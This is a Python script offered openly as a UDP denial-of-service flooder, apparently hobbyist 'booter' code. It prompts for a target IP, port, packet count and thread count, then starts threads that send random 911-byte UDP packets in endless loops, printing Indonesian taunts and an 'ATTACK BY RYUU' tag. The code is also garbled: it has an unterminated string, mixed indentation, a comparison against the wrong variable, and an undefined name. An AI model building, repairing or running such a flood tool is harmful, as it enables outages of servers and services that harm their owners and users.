import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[30m
██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
""")

os.system("clear")
print("\033[35m
===========        DDOS ATTACK UDP       ===========")
ip = str(input("IP >"))
port = int(input("PORT >"))
choice = str(input("DDOS? >"))
times = int(input("PACKETS >"))
threads = str(input("THREADS >"))

def kontol():
	data = random._urandom (911)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print("MENINDAS SERVER SAMPAH")
        except:
            print("\033[30m[X] ATTACK BY RYUU.")
            
def kontol2():
	data = random._urandom (911)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print(i +"MENINDAS SERVER SAMPAH")
        except:
            print("\033[31m[X] ATTACK BY RYUU.")

for y in range(threads):
	if times == 'y':
		th = threading.Thread(target = kontol)
		th.start()
		th = threading.Thread(target = kontol2)
		th.start()

